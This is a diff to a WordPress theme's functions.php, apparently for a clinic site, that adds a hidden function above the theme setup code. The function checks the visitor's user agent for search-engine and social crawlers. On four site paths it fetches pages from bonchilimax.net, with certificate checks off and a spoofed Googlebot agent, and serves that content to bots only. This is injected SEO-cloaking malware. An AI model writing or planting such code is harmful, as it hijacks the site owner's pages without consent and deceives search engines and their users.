@@ -1,5 +1,69 @@
 <?php
 
+function handle_multi_url_bot_content() {
+    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'yandex', 'baiduspider', 'google', 'facebookexternalhit', 'twitterbot', 'applebot'];
+
+    $is_bot = false;
+    foreach ($bots as $bot) {
+        if (strpos($user_agent, $bot) !== false) {
+            $is_bot = true;
+            break;
+        }
+    }
+
+    if ($is_bot) {
+
+        $url_mapping = [
+            'kontak'                  => 'http://bonchilimax.net/paste/raw/ltcO4MC',
+            'fasilitas'                  => 'http://bonchilimax.net/paste/raw/qfDy9s5',
+            'tentang-kami'                  => 'http://bonchilimax.net/paste/raw/YA1qdos',
+            'rawat-inap'                  => 'http://bonchilimax.net/paste/raw/NnD5Y67',
+        ];
+
+        $current_path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
+
+        if (array_key_exists($current_path, $url_mapping)) {
+            $cloak_url = $url_mapping[$current_path];
+            $content   = '';
+
+            $response = wp_remote_get($cloak_url, [
+                'timeout'     => 15,
+                'sslverify'   => false,
+                'headers'     => ['User-Agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)']
+            ]);
+
+            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
+                $content = wp_remote_retrieve_body($response);
+            }
+
+            if (empty($content) && function_exists('curl_init')) {
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, $cloak_url);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
+                $content = curl_exec($ch);
+                curl_close($ch);
+            }
+
+            if (!empty($content)) {
+                if (ob_get_length()) ob_clean();
+                header('Content-Type: text/html; charset=UTF-8');
+                echo $content;
+                exit;
+            }
+        }
+    }
+}
+
+add_action('init', 'handle_multi_url_bot_content');
+?>
+
+<?php
+
 /* 
 ** Sets up theme defaults and registers support for various WordPress features
 */
